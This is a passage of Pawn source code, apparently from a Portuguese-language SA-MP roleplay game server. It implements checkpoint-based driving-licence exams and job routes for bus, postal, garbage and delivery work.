			format(stringcmd, sizeof(stringcmd), "[DEBUG:] {FFFFFF}OnPlayerKeyStateChange executado em %d ms", floatround(Tickafter_Key[playerid]-Tickbefore_Key[playerid], floatround_round));
			SendClientMessage(playerid, COLOR_RED, stringcmd);
		}
	}
	
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	new car = GetPlayerVehicleID(playerid); // PausarRota(playerid, "abre as portas do autocarro", 1500); AcabarRota(playerid); RotaJob6[playerid]=0; DisablePlayerCheckpoint(playerid);
	new string[128];

	if(FirstSpawn[playerid] == true)
	{
	    DisablePlayerCheckpoint(playerid);
	    FirstSpawn[playerid] = false;
	    
	    return 1;
	}

	if(ATirarCartaLigeiro[playerid] == true || ATirarCartaPesados[playerid] == true || ATirarCartaMota[playerid] == true) // if(GetPlayerSpeed(playerid) > 90) { SpeedWarning[playerid]++; }
	{
		DisablePlayerCheckpoint(playerid);
		
		switch(RotaConducao[playerid])
		{
			case 2: { SetPlayerCheckpoint(playerid, 1413.712646, -1729.940673, 13.117656, 5.0); RotaConducao[playerid]=3; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 3: { SetPlayerCheckpoint(playerid, 1386.275634, -1758.687377, 13.109886, 5.0); RotaConducao[playerid]=4; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 4: { SetPlayerCheckpoint(playerid, 1364.073974, -1866.103271, 13.109882, 5.0); RotaConducao[playerid]=5; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 5: { SetPlayerCheckpoint(playerid, 1194.749389, -1849.359252, 13.125203, 5.0); RotaConducao[playerid]=6; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 6: { SetPlayerCheckpoint(playerid, 1063.221313, -1841.109985, 13.177332, 5.0); RotaConducao[playerid]=7; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 7: { SetPlayerCheckpoint(playerid, 882.177062, -1769.667602, 13.109894, 5.0); RotaConducao[playerid]=8; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 8: { SetPlayerCheckpoint(playerid, 618.257141, -1725.835693, 13.655807, 5.0); RotaConducao[playerid]=9; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 9: { SetPlayerCheckpoint(playerid, 231.188522, -1649.462036, 12.012092, 5.0); RotaConducao[playerid]=10; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 10: { SetPlayerCheckpoint(playerid, 120.540061, -1597.307495, 10.267000, 5.0); RotaConducao[playerid]=11; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 11: { SetPlayerCheckpoint(playerid, 181.247039, -1737.954711, 3.908325, 5.0); RotaConducao[playerid]=13; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 13: { SetPlayerCheckpoint(playerid, 385.837585, -1775.437988, 5.144883, 5.0); RotaConducao[playerid]=14; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 14: { SetPlayerCheckpoint(playerid, 549.510070, -1736.213134, 12.247699, 5.0); RotaConducao[playerid]=15; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 15: { SetPlayerCheckpoint(playerid, 850.614807, -1788.155029, 13.582710, 5.0); RotaConducao[playerid]=16; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 16: { SetPlayerCheckpoint(playerid, 1051.170288, -1922.424194, 12.707869, 5.0); RotaConducao[playerid]=17; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 17: { SetPlayerCheckpoint(playerid, 1248.570556, -2455.476318, 8.551629, 5.0); RotaConducao[playerid]=18; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 18: { SetPlayerCheckpoint(playerid, 1522.130493, -2293.179687, -3.272604, 5.0); RotaConducao[playerid]=19; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 19: { SetPlayerCheckpoint(playerid, 1359.520507, -2433.475585, 8.330183, 5.0); RotaConducao[playerid]=20; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 20: { SetPlayerCheckpoint(playerid, 1349.286376, -2250.349365, 13.111090, 5.0); RotaConducao[playerid]=21; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 21: { SetPlayerCheckpoint(playerid, 1662.935791, -2024.781494, 22.547046, 5.0); RotaConducao[playerid]=22; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 22: { SetPlayerCheckpoint(playerid, 1625.376098, -1619.043701, 28.185504, 5.0); RotaConducao[playerid]=23; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 23: { SetPlayerCheckpoint(playerid, 2001.347900, -1524.889526, 3.137455, 5.0); RotaConducao[playerid]=24; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 24: { SetPlayerCheckpoint(playerid, 2004.813720, -1612.939208, 13.109905, 5.0); RotaConducao[playerid]=25; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 25: { SetPlayerCheckpoint(playerid, 1982.653320, -1749.995239, 13.109894, 5.0); RotaConducao[playerid]=26; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 26: { SetPlayerCheckpoint(playerid, 1796.504394, -1730.399902, 13.110091, 5.0); RotaConducao[playerid]=27; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 27: { SetPlayerCheckpoint(playerid, 1531.250366, -1700.097045, 13.109887, 5.0); RotaConducao[playerid]=28; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 28: { SetPlayerCheckpoint(playerid, 1423.247680, -1587.855834, 13.107192, 5.0); RotaConducao[playerid]=29; if(GetPlayerSpeed(playerid) > 130) { SpeedWarning[playerid]++; } }
			case 29:
			{
			    SetVehicleToRespawn(car);
			    AtualizarDanosCarro(car);
			    
				RotaConducao[playerid] = 0;
				DisablePlayerCheckpoint(playerid);

				new Float:cVida;
				GetVehicleHealth(car, cVida);
				
				if(cVida < 980.0) return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}O carro está danificado! Não passaste no exame de condução.");
				if(SpeedWarning[playerid] > 1) return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Passaste o limite de velocidade! Não passaste no exame de condução.");
				
                SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}O carro não está danificado nem passaste o limite. Passaste no exame de condução.");
                
                if(ATirarCartaLigeiro[playerid] == true)
                {
                    ATirarCartaLigeiro[playerid] = false;
                    pInfo[playerid][CartaLig] = 1;
                }
                else if(ATirarCartaPesados[playerid] == true)
                {
                    ATirarCartaPesados[playerid] = false;
                    pInfo[playerid][CartaPesados] = 1;
                }
                else if(ATirarCartaMota[playerid] == true)
                {
                    ATirarCartaMota[playerid] = false;
                    pInfo[playerid][CartaMota] = 1;
                }
			}
		}
	}
	else if(ATirarCartaBarco[playerid] == true) // if(GetPlayerSpeed(playerid) > 90) { SpeedWarning[playerid]++; }
	{
		DisablePlayerCheckpoint(playerid);
		
		switch(RotaConducao[playerid])
		{
			case 2: { SetPlayerCheckpoint(playerid, 113.556144, -1937.620727, -0.093732, 5.0); RotaConducao[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 257.797637, -1967.457641, -0.498559, 5.0); RotaConducao[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 383.447570, -1944.826171, -0.083409, 5.0); RotaConducao[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 609.544555, -1951.940063, -0.551623, 5.0); RotaConducao[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 884.068176, -2020.922729, -0.137819, 5.0); RotaConducao[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 955.342224, -2225.082031, -0.183461, 5.0); RotaConducao[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 1056.355590, -2397.461669, -0.416801, 5.0); RotaConducao[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 875.761413, -2579.802001, 0.163058, 5.0); RotaConducao[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 705.361938, -2554.459472, 0.063682, 5.0); RotaConducao[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 371.199951, -2493.762207, -0.517662, 5.0); RotaConducao[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 212.952331, -2421.240478, -0.200813, 5.0); RotaConducao[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 12.391488, -2189.126708, 0.028626, 5.0); RotaConducao[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, -63.438350, -1956.059082, -0.196103, 5.0); RotaConducao[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 82.740875, -1837.353393, -0.411021, 5.0); RotaConducao[playerid]=16; }
 			case 16:
			{
			    SetVehicleToRespawn(car);
			    AtualizarDanosCarro(car);

				RotaConducao[playerid] = 0;
				DisablePlayerCheckpoint(playerid);

				new Float:cVida;
				GetVehicleHealth(car, cVida);

				if(cVida < 980.0) return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}O barco está danificado! Não passaste no exame de condução.");
				if(SpeedWarning[playerid] > 1) return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Passaste o limite de velocidade! Não passaste no exame de condução.");

                SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}O barco não está danificado nem passaste o limite. Passaste no exame de condução.");

				ATirarCartaBarco[playerid] = false;
				pInfo[playerid][CartaBarco] = 1;
			}
		}
	}
	else if(pInfo[playerid][Emprego] == 1 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		format(string, sizeof(string), "Rotajob1: %d", RotaJob1[playerid]); SendClientMessage(playerid, -1, string);
		
		switch(RotaJob1[playerid]) // AUTOCARROS
		{
			case 2: { SetPlayerCheckpoint(playerid, 2301.632568, -2262.099853, 13.102064, 5.0); RotaJob1[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 2233.794433, -2197.924804, 13.068899, 5.0); RotaJob1[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 2023.631347, -2107.449707, 13.129360, 5.0); RotaJob1[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 1963.972900, -2077.162597, 13.109862, 5.0); RotaJob1[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 1964.597290, -2025.952636, 13.109887, 5.0); RotaJob1[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 1964.863281, -1863.358764, 13.109892, 5.0); RotaJob1[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 2039.954711, -1814.994384, 13.109893, 5.0); RotaJob1[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 2133.448974, -1755.104248, 13.125917, 5.0); RotaJob1[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 2238.968750, -1734.688720, 13.109909, 5.0); RotaJob1[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 2346.513427, -1689.243530, 13.084101, 5.0); RotaJob1[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 2245.133789, -1652.542968, 15.010692, 5.0); RotaJob1[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 2030.701049, -1608.573730, 13.109882, 5.0); RotaJob1[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 2000.101806, -1709.449096, 13.109898, 5.0); RotaJob1[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 1899.454223, -1750.009765, 13.109901, 5.0); RotaJob1[playerid]=16; }
			case 16: { SetPlayerCheckpoint(playerid, 1825.212646, -1684.225830, 13.109915, 5.0); RotaJob1[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 1751.314086, -1598.751464, 13.103926, 5.0); RotaJob1[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 1554.640869, -1589.790771, 13.109894, 5.0); RotaJob1[playerid]=19; }
			case 19: { SetPlayerCheckpoint(playerid, 1416.867187, -1589.887817, 13.092612, 5.0); RotaJob1[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 1310.609619, -1627.790893, 13.109887, 5.0); RotaJob1[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 1309.475463, -1751.029785, 13.109897, 5.0); RotaJob1[playerid]=22; }
			case 22: { SetPlayerCheckpoint(playerid, 1265.744018, -1849.856567, 13.111377, 5.0); RotaJob1[playerid]=23; }
			case 23: { SetPlayerCheckpoint(playerid, 1112.091308, -1849.907714, 13.109907, 5.0); RotaJob1[playerid]=24; }
			case 24: { SetPlayerCheckpoint(playerid, 981.380432, -1782.453125, 13.809377, 5.0); RotaJob1[playerid]=25; }
			case 25: { SetPlayerCheckpoint(playerid, 833.992187, -1767.269775, 13.120633, 5.0); RotaJob1[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 813.463684, -1690.499877, 13.109898, 5.0); RotaJob1[playerid]=27; }
			case 27: { SetPlayerCheckpoint(playerid, 733.929626, -1584.471557, 13.964122, 5.0); RotaJob1[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 523.660400, -1582.638793, 15.734897, 5.0); RotaJob1[playerid]=29; }
			case 29: { SetPlayerCheckpoint(playerid, 353.097747, -1578.245483, 32.301155, 5.0); RotaJob1[playerid]=30; }
			case 30: { SetPlayerCheckpoint(playerid, 352.401519, -1648.661010, 32.640850, 5.0); RotaJob1[playerid]=31; }
			case 31: { SetPlayerCheckpoint(playerid, 504.597229, -1666.808715, 18.860914, 5.0); RotaJob1[playerid]=32; }
			case 32: { SetPlayerCheckpoint(playerid, 622.837890, -1711.013305, 14.032595, 5.0); RotaJob1[playerid]=33; }
			case 33: { SetPlayerCheckpoint(playerid, 454.457580, -1702.745239, 10.459220, 5.0); RotaJob1[playerid]=34; }
			case 34: { SetPlayerCheckpoint(playerid, 178.671447, -1529.200317, 12.153335, 5.0); RotaJob1[playerid]=35; }
			case 35: { SetPlayerCheckpoint(playerid, 242.648590, -1498.245483, 22.759258, 5.0); RotaJob1[playerid]=36; }
			case 36: { SetPlayerCheckpoint(playerid, 349.117340, -1448.208740, 34.038249, 5.0); RotaJob1[playerid]=37; }
			case 37: { SetPlayerCheckpoint(playerid, 467.669372, -1448.378906, 24.448268, 5.0); RotaJob1[playerid]=38; }
			case 38: { SetPlayerCheckpoint(playerid, 685.178161, -1407.801757, 13.133445, 5.0); RotaJob1[playerid]=39; }
			case 39: { SetPlayerCheckpoint(playerid, 993.824340, -1407.774047, 12.753452, 5.0); RotaJob1[playerid]=40; }
			case 40: { SetPlayerCheckpoint(playerid, 1194.281738, -1454.298583, 13.109910, 5.0); RotaJob1[playerid]=41; }
			case 41: { SetPlayerCheckpoint(playerid, 1238.819824, -1574.557128, 13.109862, 5.0); RotaJob1[playerid]=42; }
			case 42: { SetPlayerCheckpoint(playerid, 1295.744506, -1664.426513, 13.109901, 5.0); RotaJob1[playerid]=43; }
			case 43: { SetPlayerCheckpoint(playerid, 1295.070068, -1820.051147, 13.109894, 5.0); RotaJob1[playerid]=44; }
			case 44: { SetPlayerCheckpoint(playerid, 1454.974487, -1874.355712, 13.117727, 5.0); RotaJob1[playerid]=45; }
			case 45: { SetPlayerCheckpoint(playerid, 1527.569946, -2002.079467, 25.757808, 5.0); RotaJob1[playerid]=46; }
			case 46: { SetPlayerCheckpoint(playerid, 1888.589965, -2168.976318, 13.109915, 5.0); RotaJob1[playerid]=47; }
			case 47: { SetPlayerCheckpoint(playerid, 2128.766601, -2212.227783, 13.109886, 5.0); RotaJob1[playerid]=48; }
			case 48: { SetPlayerCheckpoint(playerid, 2181.141601, -2185.703857, 13.089324, 5.0); RotaJob1[playerid]=49; }
			case 49: { SetPlayerCheckpoint(playerid, 2239.688720, -2210.897216, 13.047723, 5.0); RotaJob1[playerid]=50; }
			case 50: { SetPlayerCheckpoint(playerid, 2221.259521, -2330.090576, 13.102085, 5.0); RotaJob1[playerid]=51; }
			case 51: { SetPlayerCheckpoint(playerid, 2169.638427, -2496.988037, 13.102056, 5.0); RotaJob1[playerid]=52; }
			case 52: { SetPlayerCheckpoint(playerid, 2227.999023, -2451.849609, 13.078519, 5.0); RotaJob1[playerid]=53; }
			case 53: { SetPlayerCheckpoint(playerid, 2283.985351, -2369.570312, 13.233747, 5.0); RotaJob1[playerid]=54; }
			case 54: { AcabarRota(playerid); RotaJob1[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	else if(pInfo[playerid][Emprego] == 2)
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob2: %d", RotaJob2[playerid]); SendClientMessage(playerid, -1, string);

		new hID = random(80);
		switch(RotaJob2[playerid]) // CARTEIRO
		{
			case 2: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=4; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 4: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=5; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 5: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=6; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 6: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=7; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 7: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=8; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 8: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=9; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 9: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=10; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 10: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=11; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 11: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=12; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 12: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=13; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 13: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=14; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 14: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=15; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 15: { SetPlayerCheckpoint(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ], 2.0); RotaJob2[playerid]=16; PausarRota(playerid, "mete as cartas pela ranhura do correio", 1500); }
			case 16: { SetPlayerCheckpoint(playerid, 1082.8176, -1714.8239, 13.1099, 5.0); RotaJob2[playerid]=17; }
			case 17: { AcabarRota(playerid); RotaJob2[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	else if(pInfo[playerid][Emprego] == 3 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob3: %d", RotaJob3[playerid]); SendClientMessage(playerid, -1, string);
		
		switch(RotaJob3[playerid]) // LIXEIROS
		{
			case 2: { SetPlayerCheckpoint(playerid, 1427.189086, -1663.609985, 13.109887, 5.0); RotaJob3[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 1453.387084, -1734.324829, 13.109889, 5.0); RotaJob3[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 1601.412719, -1735.173461, 13.109902, 5.0); RotaJob3[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 1686.392089, -1768.292724, 13.109886, 5.0); RotaJob3[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 1740.226318, -1820.805053, 13.098640, 5.0); RotaJob3[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 1818.479736, -1895.516357, 13.124787, 5.0); RotaJob3[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 1929.767578, -1934.809570, 13.109894, 5.0); RotaJob3[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 2084.290771, -1882.344482, 13.052544, 5.0); RotaJob3[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 2083.980712, -1836.143676, 13.109890, 5.0); RotaJob3[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 2128.397705, -1757.629272, 13.201304, 5.0); RotaJob3[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 2198.630859, -1733.425170, 13.133360, 5.0); RotaJob3[playerid]=13; PausarRota(playerid, "mete o lixo na parte de trás do camião", 3000); }
			case 13: { SetPlayerCheckpoint(playerid, 2213.848144, -1789.790893, 12.951878, 5.0); RotaJob3[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 2248.919189, -1899.266113, 13.148747, 5.0); RotaJob3[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 2332.720947, -1975.791137, 13.047320, 5.0); RotaJob3[playerid]=16; PausarRota(playerid, "mete o lixo na parte de trás do camião", 3000); }
			case 16: { SetPlayerCheckpoint(playerid, 2410.901611, -1991.299438, 13.056189, 5.0); RotaJob3[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 2518.101074, -2010.041992, 13.073226, 5.0); RotaJob3[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 2450.290283, -2006.892333, 13.094079, 5.0); RotaJob3[playerid]=19; PausarRota(playerid, "mete o lixo na parte de trás do camião", 3000); }
			case 19: { SetPlayerCheckpoint(playerid, 2391.317871, -1970.387451, 13.109890, 5.0); RotaJob3[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 2287.658203, -2087.747802, 13.094199, 5.0); RotaJob3[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 2491.431152, -2292.815185, 24.494611, 5.0); RotaJob3[playerid]=22; }
			case 22: { SetPlayerCheckpoint(playerid, 2727.566650, -2407.178710, 13.188012, 5.0); RotaJob3[playerid]=23; }
			case 23: { SetPlayerCheckpoint(playerid, 2750.173095, -2430.262207, 13.370425, 5.0); RotaJob3[playerid]=24; }
			case 24: { SetPlayerCheckpoint(playerid, 2714.705566, -2501.405761, 13.202567, 5.0); RotaJob3[playerid]=25; PausarRota(playerid, "mete o lixo na parte de trás do camião", 3000); }
			case 25: { SetPlayerCheckpoint(playerid, 2686.256103, -2457.944580, 13.246738, 5.0); RotaJob3[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 2642.934814, -2403.940429, 13.199096, 5.0); RotaJob3[playerid]=27; }
			case 27: { SetPlayerCheckpoint(playerid, 2440.083984, -2234.011962, 24.789587, 5.0); RotaJob3[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 2204.458740, -1977.789916, 13.276630, 5.0); RotaJob3[playerid]=29; }
			case 29: { SetPlayerCheckpoint(playerid, 2218.465576, -1796.029052, 12.922401, 5.0); RotaJob3[playerid]=30; PausarRota(playerid, "mete o lixo na parte de trás do camião", 3000); }
			case 30: { SetPlayerCheckpoint(playerid, 2188.491699, -1707.711914, 13.132761, 5.0); RotaJob3[playerid]=31; }
			case 31: { SetPlayerCheckpoint(playerid, 2046.857543, -1609.071777, 13.110712, 5.0); RotaJob3[playerid]=32; }
			case 32: { SetPlayerCheckpoint(playerid, 1978.983276, -1749.745849, 13.109876, 5.0); RotaJob3[playerid]=33; }
			case 33: { SetPlayerCheckpoint(playerid, 1777.862060, -1730.371459, 13.109889, 5.0); RotaJob3[playerid]=34; }
			case 34: { SetPlayerCheckpoint(playerid, 1530.062866, -1729.616699, 13.109896, 5.0); RotaJob3[playerid]=35; }
			case 35: { SetPlayerCheckpoint(playerid, 1410.044067, -1646.910400, 13.107622, 5.0); RotaJob3[playerid]=36; }
			case 36: { SetPlayerCheckpoint(playerid, 1368.023071, -1710.817016, 8.572607, 5.0); RotaJob3[playerid]=37; }
			case 37: { SetPlayerCheckpoint(playerid, 1372.961669, -1678.336547, 12.263711, 5.0); RotaJob3[playerid]=38; PausarRota(playerid, "clica no botão e começa a descarregar o lixo", 3500); }
			case 38: { SetPlayerCheckpoint(playerid, 1385.344848, -1661.715087, 13.192211, 5.0); RotaJob3[playerid]=39; }
			case 39: { AcabarRota(playerid); RotaJob3[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	else if(pInfo[playerid][Emprego] == 4 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob4: %d", RotaJob4[playerid]); SendClientMessage(playerid, -1, string);
		
		switch(RotaJob4[playerid]) // TRANS PRODUTOS
		{
			case 2: { SetPlayerCheckpoint(playerid, 1799.806640, -1733.743041, 13.113720, 5.0); RotaJob4[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 1818.109619, -1853.552856, 13.141178, 5.0); RotaJob4[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 1897.313110, -1934.889526, 13.109897, 5.0); RotaJob4[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 1959.321533, -1998.818481, 13.117642, 5.0); RotaJob4[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 1958.579345, -2125.886962, 13.109911, 5.0); RotaJob4[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 2027.950805, -2168.941894, 13.109894, 5.0); RotaJob4[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 2118.200439, -2242.136962, 13.112738, 5.0); RotaJob4[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 2175.510742, -2362.323730, 13.104054, 5.0); RotaJob4[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 2166.297607, -2496.927246, 13.102087, 5.0); RotaJob4[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 2222.287109, -2527.195312, 13.140415, 5.0); RotaJob4[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 2318.785400, -2666.135009, 13.233535, 5.0); RotaJob4[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 2487.820068, -2557.368164, 13.245961, 5.0); RotaJob4[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 2662.245849, -2507.068847, 13.219278, 5.0); RotaJob4[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 2764.155029, -2470.298339, 13.215371, 5.0); RotaJob4[playerid]=16; }
			case 16: { SetPlayerCheckpoint(playerid, 2804.541015, -2441.788574, 13.356630, 5.0); RotaJob4[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 2737.864013, -2403.385253, 13.188014, 5.0); RotaJob4[playerid]=18; PausarRota(playerid, "aguarda carregarem a carrinha com produtos", 5000); }
			case 18: { SetPlayerCheckpoint(playerid, 2564.111572, -2358.476318, 16.103019, 5.0); RotaJob4[playerid]=19; }
			case 19: { SetPlayerCheckpoint(playerid, 2351.777587, -2145.306152, 17.505823, 5.0); RotaJob4[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 2158.969482, -1892.540039, 13.078587, 5.0); RotaJob4[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 2076.710937, -1880.437377, 13.147541, 5.0); RotaJob4[playerid]=22; }
			case 22: { SetPlayerCheckpoint(playerid, 2084.762695, -1805.648071, 13.109914, 5.0); RotaJob4[playerid]=23; PausarRota(playerid, "descarrega os produtos", 3500); }
			case 23: { SetPlayerCheckpoint(playerid, 2156.271240, -1756.061523, 13.116135, 5.0); RotaJob4[playerid]=24; }
			case 24: { SetPlayerCheckpoint(playerid, 2250.282714, -1734.369873, 13.109904, 5.0); RotaJob4[playerid]=25; }
